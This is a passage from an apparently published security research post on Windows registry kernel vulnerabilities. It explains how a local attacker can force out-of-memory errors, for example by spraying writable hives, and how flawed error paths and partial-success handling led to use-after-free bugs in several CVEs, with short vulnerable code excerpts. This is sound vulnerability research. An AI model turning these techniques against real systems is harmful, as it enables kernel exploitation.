 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;Status;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// More calls...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;STATUS_SUCCESS;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Of course, this is a significant simplification, as real-world code contains keywords and constructs such as if statements, switch statements, various loops, and so on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The key point is that a considerable portion of higher-level functions call internal, lower-level functions specialized for specific tasks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Handling potential errors signalled by these functions is an important aspect of kernel code (or any code, for that matter).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In low-level Windows code, error propagation occurs using the NTSTATUS type, which is essentially a signed 32-bit integer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A value of 0 signifies success (STATUS_SUCCESS), positive values indicate success but with additional information, and negative values denote errors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The sign of the number is checked by the NT_SUCCESS macro.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;D&lt;/span&gt;&lt;span&gt;uring my research, I dedicated significant time to analyzing the error handling logic. L&lt;/span&gt;&lt;span&gt;et&amp;#39;s take a moment to think about the types of errors that could occur during registry operations, and the conditions that might cause them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;A common trait of all actions that modify data in the registry is that they allocate memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The simplest example is the allocation of auxiliary buffers from kernel pools, requested through functions from the ExAllocatePool&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;group.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If there is very little available memory at a given point in time, one of the allocation requests may return the STATUS_INSUFFICIENT_RESOURCES error code, which will be propagated back to the original caller.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And since we assume that we take on the role of a local attacker who has the ability to execute code on the machine, artificially occupying all available memory is potentially possible in many ways.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;So this is one way to trigger errors while performing operations on the registry, but admittedly not an ideal way, as it largely depends on the amount of RAM and the maximum pagefile size.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, in a situation where the kernel has so little memory that single allocations start to fail, there is a high probability of the system crashing elsewhere before the vulnerability is successfully exploited.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And finally, if several allocations are requested in nearby code in a short period of time, it seems practically impossible to take precise control over which of them will succeed and which will not.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Nonetheless, t&lt;/span&gt;&lt;span&gt;he overall concept of out-of-memory conditions is a very promising avenue for attack, especially considering that the registry primarily operates on memory-mapped hives using its own allocator, in addition to objects from kernel pools.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The situation is even more favorable for an attacker due to the 2 GiB size limitation of each of the two storage types (stable and volatile) within a hive. While this is a relatively large value, it is achievable to occupy it in under a minute on today&amp;#39;s machines.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The situation is even easier if the volatile space that needs to be occupied, as it resides solely in memory and is not flushed to disk &amp;ndash; so filling two gigabytes of memory is then a matter of seconds.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be accomplished, for example, by creating many long registry values, which is a straightforward task when dealing with a controlled hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, even in system hives, this is often feasible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To perform data spraying on a given hive, we only need a single key granting us write permissions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For instance, both HKLM\Software and HKLM\System contain numerous keys that allow write access to any user in the system, effectively permitting them to fill it to capacity.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, the &amp;quot;global registry quota&amp;quot; mechanism, implemented by the internal CmpClaimGlobalQuota and CmpReleaseGlobalQuota functions, ensures that the total memory occupied by registry data in the system does not exceed 4 GiB. Besides filling the entire space of a specific hive, this is thus another way to trigger out-of-memory conditions in the registry, especially when targeting a hive without write permissions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A concrete example where this mechanism could have been employed to corrupt the HKLM\SAM system hive is the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/15_Registry_quota_exhausted_SAM_corruption&quot;&gt;CVE-2024-26181&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;vulnerability.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Considering all this, it is a fair assumption that a local attacker can cause any call to ExAllocatePool&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;, HvAllocateCell, and HvReallocateCell (with a length greater than the existing cell) to fail.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This opens up a large number of potential error paths to analyze.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The HvAllocateCell calls are a particularly interesting starting point for analysis, as there are quite a few of them and almost all of them belong to the attack surface accessible to a regular user&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c44 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEWO6JKQOx4lDfgfYlL4Uwu95s44RT12mguryzT78XMvWxyWcgc9zD_QAwuEnbV0NjR8ujJdB8kcSpNAoeW7V9Cfps4oL4QntdF5Kt_F5OVrqcSU7Qke9ZyzKcqbNu4tgWBMOvs1lgO3Iryj7hpUUfOEWUDZzgdYC6jcTZ0g963OWMZTP7cpvJYp0_jQ8/s1200/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEWO6JKQOx4lDfgfYlL4Uwu95s44RT12mguryzT78XMvWxyWcgc9zD_QAwuEnbV0NjR8ujJdB8kcSpNAoeW7V9Cfps4oL4QntdF5Kt_F5OVrqcSU7Qke9ZyzKcqbNu4tgWBMOvs1lgO3Iryj7hpUUfOEWUDZzgdYC6jcTZ0g963OWMZTP7cpvJYp0_jQ8/s1200/image4.png&quot; border=&quot;0&quot; alt=&quot;A screenshot shows a debugger window titled xrefs to HvAllocateCell. The window lists numerous functions and their memory addresses under columns Direction, Type, Address, and Text. Nearly all entries show different system functions making a call to HvAllocateCell.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A screenshot shows a debugger window titled xrefs to HvAllocateCell. The window lists numerous functions and their memory addresses under columns Direction, Type, Address, and Text. Nearly all entries show different system functions making a call to HvAllocateCell.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c44 ujDEXfwdRL-c11 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;There are two primary reasons why focusing on the analysis of error paths can be a good way to find security bugs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;First, it stands to reason that on regular computers used by users, it is extremely rare for a given hive to grow to 2 GiB and run out of space, or for all registry data to simultaneously occupy 4 GiB of memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that these code paths are practically never executed under normal conditions, and even if there were bugs in them, there is a very small chance that they would ever be noticed by anyone.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Such rarely executed code paths are always a real treat for security researchers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The second reason is that proper error handling in code is inherently difficult.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Many operations involve numerous steps that modify the hive&amp;#39;s internal state.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If an issue arises during these operations, the registry code must revert all changes and restore the registry to its original state (at least from the macro-architectural perspective).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This requires the developer to be fully aware of all changes applied so far when implementing each error path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, proper error handling must be considered during the initial design of the control flow as well, because some registry actions are irreversible (e.g., freeing cells).&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he code must thus be structured so that all such operations are placed at the very end of the logic, where errors cannot occur anymore and successful execution is guaranteed.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;One example of such a vulnerability is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451533&quot;&gt;CVE-2023-23421&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which boiled down to the following code:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;CmpCommitRenameKeyUoW(_CM_KCB_UOW&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;*uow)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;(!CmpAddSubKeyEx(Hive,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ParentKey,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NewNameKey)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;||&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;!CmpRemoveSubKey(Hive,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ParentKey,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;OldNameKey))&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;CmpFreeKeyByCell(Hive,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NewNameKey);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;STATUS_INSUFFICIENT_RESOURCES;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The issue here was that if the CmpRemoveSubKey call failed, the corresponding error path should have reversed the effect of the CmpAddSubKeyEx function in the previous line, but in practice it didn&amp;#39;t.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, it was possible to end up with a dangling reference to a freed key in the subkey list, which was a typical use-after-free condition.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;A second interesting example of this type of bug was &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451505&quot;&gt;CVE-2023-21747&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where an out-of-memory error could occur during a highly sensitive operation, hive unloading.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As there was no way to revert the state at the time of the OOM, the&lt;/span&gt;&lt;span&gt;&amp;nbsp;vulnerability was fixed by Microsoft by refactoring the CmpRemoveSubKeyFromList function and other related functions so that they no longer allocate memory from kernel pools and thus there is no longer a physical possibility of them failing.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Finally, I&amp;#39;ll mention &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451600&quot;&gt;CVE-2023-38154&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the problem wasn&amp;#39;t incorrect error handling, but a complete lack of it &amp;ndash; the return value of the HvpPerformLogFileRecovery function was ignored, even though there was a real possibility it could end with an error.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is a fairly classic type of bug that can occur in any programming language, but it&amp;#39;s definitely worth keeping in mind when auditing the Windows kernel.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.4k8u1brcz0m6&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Susceptibility to mishandling partial successes&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The previous section discusses bugs in error handling where&lt;/span&gt;&lt;span&gt;&amp;nbsp;each function is responsible for reversing the state it has modified.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, some functions don&amp;#39;t adhere to this operational model.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Instead of operating on an &amp;quot;all-or-nothing&amp;quot; basis, they work on a best-effort basis, aiming to accomplish as much of a given task as possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If an error occurs, they leave any changes made in place, e.g., because this result is still preferable to not making any changes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This introduces a third possible output state for such functions: complete success, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c49&quot;&gt;partial success&lt;/span&gt;&lt;span&gt;, and complete failure.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This might be problematic, as the approach is incompatible with the typical usage of the NTSTATUS type, which is best suited for conveying one of two (not three) states.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In theory&lt;/span&gt;&lt;span&gt;, it is a 32-bit integer type, so it could store the additional information of the status being a partial success, and not being unambiguously positive or negative.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, however, the convention is to directly propagate the last error encountered within the inner function, and the outer functions very rarely &lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;dig into&lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;specific error codes, instead assuming that if NT_SUCCESS returns FALSE, the entire operation has failed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Such confusion at the cross-function level may have security implications if the outer function should take some additional steps in the event of a partial success of the inner function, but due to the binary interpretation of the returned error code, it ultimately does not execute them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;A classic example of such a bug is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451661&quot;&gt;CVE-2024-26182&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which occurred at the intersection of the CmpAddSubKeyEx (outer) and CmpAddSubKeyToList (inner) functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The problem here was that CmpAddSubKeyToList implements complex, potentially multi-step logic for expanding the subkey list, which could perform a cell reallocation and subsequently encounter an OOM error.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the other hand, the CmpAddSubKeyEx function assumed that the cell index in the subkey list should only be updated in the hive structures if CmpAddSubKeyToList fully succeeds.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As a result&lt;/span&gt;&lt;span&gt;, the partial success of CmpAddSubKeyToList could lead to a classic use-after-free situation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An attentive reader will probably notice that the return value type of the CmpAddSubKeyToList routine was BOOL and not NTSTATUS, but the bug pattern is identical.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.1s9jvbp0s0ht&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Overall complexity introduced over time&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;O&lt;/span&gt;&lt;span&gt;ne of the biggest problems with the modern implementation of the registry is that over the decades of developing this functionality, many changes and new features have been introduced.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This has caused the level of complexity of its internal state to increase so much that it seems difficult to grasp for one person, unless they are a full-time registry expert that has worked on it full-time over a period of months or years.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I personally believe that the registry existed in its most elegant form somewhere around Windows NT 3.1 &amp;ndash; 3.51 (i.e. in the years 1993&amp;ndash;1996).&lt;/span&gt;&lt;span&gt;&amp;nbsp;At the time, t&lt;/span&gt;&lt;span&gt;he mechanism was intuitive and logical for both developers and its users.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each object (key, value) either existed or not, each operation ended in either success or failure, and when it 